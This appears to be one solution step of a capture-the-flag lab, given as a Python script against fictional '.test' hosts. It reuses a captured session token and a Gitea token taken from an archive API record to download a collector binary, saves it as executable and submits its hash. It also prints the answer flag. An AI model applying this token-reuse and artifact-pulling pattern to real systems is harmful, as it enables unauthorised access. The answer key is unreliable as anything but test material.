Requires W08.2 (exchange reconstructed). Use Gitea token from W12.1 to download collector binary and submit SHA256 proof.

```python
import json, ssl, urllib.request, pathlib, hashlib, base64

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}
hg = {k: v for k, v in h.items() if k != "Content-Type"}
BASE = "https://retained-archive.arwc.test"

# W12.1: get quarantine for Gitea token and collector info
d1 = json.loads(urllib.request.urlopen(urllib.request.Request(f"{BASE}/api/collectors/quarantine", headers=hg), context=ctx).read())
rec = d1["record"]
gitea_token = rec["collector_access_token"]
repo = rec.get("collector_repository", "arwc-archive/retained-collectors")
build_id = rec["collector_build_id"]  # COLLECT-CRR-12

# Download collector-crr binary from Gitea engineering.arwc.test
gitea_ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
gitea_resp = json.loads(urllib.request.urlopen(
    urllib.request.Request(f"https://engineering.arwc.test/api/v1/repos/{repo}/contents/collector-crr",
                            headers={"Authorization": f"token {gitea_token}"}),
    context=gitea_ctx, timeout=30).read())
binary = base64.b64decode(gitea_resp["content"])
sha256 = hashlib.sha256(binary).hexdigest()

# Save the binary (can be executed to find embedded identifiers)
pathlib.Path("retained-artifact").write_bytes(binary)
pathlib.Path("retained-artifact").chmod(0o700)

# Submit SHA256 proof to archive
body = json.dumps({"build_id": build_id, "collector_sha256": sha256}).encode()
d = json.loads(urllib.request.urlopen(urllib.request.Request(f"{BASE}/api/collectors/handover",
    data=body, headers=h, method="POST"), context=ctx).read())
print("record_id:", d["record"]["record_id"])   # COLLECTOR-CRR-12
print("language:", d["record"]["language"])     # Go 1.22
print("flag:", d["flag"])                        # FLAG{debd8573ad911cbb}
```

Flag: `FLAG{debd8573ad911cbb}` in the top-level `flag` field.
